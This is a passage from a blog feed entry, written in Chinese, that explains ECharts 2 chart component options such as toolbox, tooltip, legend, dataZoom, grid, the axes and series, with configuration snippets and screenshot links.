class="string">'饼图切换'</span>,</span><br><span class="line"></span><br><span class="line">            funnel: <span class="string">'漏斗图切换'</span></span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        option: &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// line: &#123;...&#125;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// bar: &#123;...&#125;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// stack: &#123;...&#125;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// tiled: &#123;...&#125;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// force: &#123;...&#125;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// chord: &#123;...&#125;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// pie: &#123;...&#125;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// funnel: &#123;...&#125;</span></span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        type : []</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    restore : &#123;</span><br><span class="line"></span><br><span class="line">        show : <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">        title : <span class="string">'还原'</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    saveAsImage : &#123;</span><br><span class="line"></span><br><span class="line">        show : <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">        title : <span class="string">'保存为图片'</span>,</span><br><span class="line"></span><br><span class="line">        type : <span class="string">'png'</span>,</span><br><span class="line"></span><br><span class="line">        lang : [<span class="string">'点击保存'</span>]</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、tooltip"><a href="#四、tooltip" class="headerlink" title="四、tooltip"></a>四、tooltip</h2><ul><li>提示框，鼠标悬浮交互时的信息提示</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-b9c8f725f2f4a50a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="五、legend"><a href="#五、legend" class="headerlink" title="五、legend"></a>五、legend</h2><ul><li>图例，每个图表最多仅有一个图例，混搭图表共享</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-0d79caad2b169951.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="六、dataRange"><a href="#六、dataRange" class="headerlink" title="六、dataRange"></a>六、dataRange</h2><ul><li>值域选择，每个图表最多仅有一个值域控件</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-c0df8ad67dbd51b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="七、dataZoom"><a href="#七、dataZoom" class="headerlink" title="七、dataZoom"></a>七、dataZoom</h2><ul><li><a href="http://echarts.baidu.com/echarts2/doc/example/dataZoom.html" target="_blank" rel="noopener">数据区域缩放</a>。与toolbox.feature.dataZoom同步，仅对直角坐标系图表有效</li></ul><h2 id="roamController"><a href="#roamController" class="headerlink" title="roamController"></a>roamController</h2><ul><li><a href="http://echarts.baidu.com/echarts2/doc/example/map1.html" target="_blank" rel="noopener">缩放漫游组件</a>，仅对地图有效</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-15c5718cc0299a2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="八、grid"><a href="#八、grid" class="headerlink" title="八、grid"></a>八、grid</h2><blockquote><p>直角坐标系内绘图网格</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-264f17badedea9f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="九、xAxis"><a href="#九、xAxis" class="headerlink" title="九、xAxis"></a>九、xAxis</h2><blockquote><p>直角坐标系中横轴数组，数组中每一项代表一条横轴坐标轴，仅有一条时可省略数组。最多同时存在2条横轴，单条横轴时可指定安放于grid的底部（默认）或顶部，2条同时存在时位置互斥，默认第一条安放于底部，第二条安放于顶部</p></blockquote><h2 id="十、yAxis"><a href="#十、yAxis" class="headerlink" title="十、yAxis"></a>十、yAxis</h2><blockquote><p>直角坐标系中纵轴数组，数组中每一项代表一条纵轴坐标轴，仅有一条时可省略数组。最多同时存在2条纵轴，单条纵轴时可指定安放于grid的左侧（默认）或右侧，2条同时存在时位置互斥，默认第一条安放于左侧，第二条安放于右侧</p></blockquote><ul><li>坐标轴有三种类型，类目型、数值型和时间型，纵轴通常为数值型，但条形图时则纵轴为类目型</li></ul><h2 id="十一、series（通用）"><a href="#十一、series（通用）" class="headerlink" title="十一、series（通用）"></a>十一、series（通用）</h2><blockquote><p>驱动图表生成的数据内容数组，数组中每一项为一个系列的选项及数据，其中个别选项仅在部分图表类型中有效，请注意适用类型</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;十一个组件选项主要用来进行交互&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;一、Timeline选项&quot;&gt;&lt;a href=&quot;#一、Timeline选项&quot; class=&quot;headerlink&quot; title=&quot;一、Timeline选项&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="Echart" scheme="http://blog.poetries.top/tags/Echart/"/>
    
  </entry>
  
</feed>
